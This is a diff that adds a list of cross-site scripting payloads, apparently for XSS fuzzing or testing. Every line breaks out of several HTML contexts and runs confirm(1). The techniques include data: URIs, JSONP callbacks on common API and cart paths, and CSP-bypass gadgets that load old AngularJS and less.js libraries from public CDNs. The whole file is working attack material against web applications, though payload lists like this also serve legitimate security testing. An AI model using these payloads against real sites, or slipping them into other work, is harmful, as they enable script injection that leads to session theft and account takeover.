@@ -1,0 +1,13 @@
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /K>confirm`1`</Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script Src=Data:,confirm`1`>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=Data:,confirm`1`></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/api.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/cart.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/cart.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/cart/add.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/search.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/search.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=https:ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js></Script/><B /Style=position:fixed;top:0;left:0;font-size:999px%0C/Ng-App /Ng-Csp /Ng-Mouseenter=$event.view.confirm(1)>___
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Style /Type=text/less>k{n:`function(){confirm(1)}()`}</Style/><Script /Src=https:cdnjs.cloudflare.com/ajax/libs/less.js/2.7.1/less.min.js></Script/>
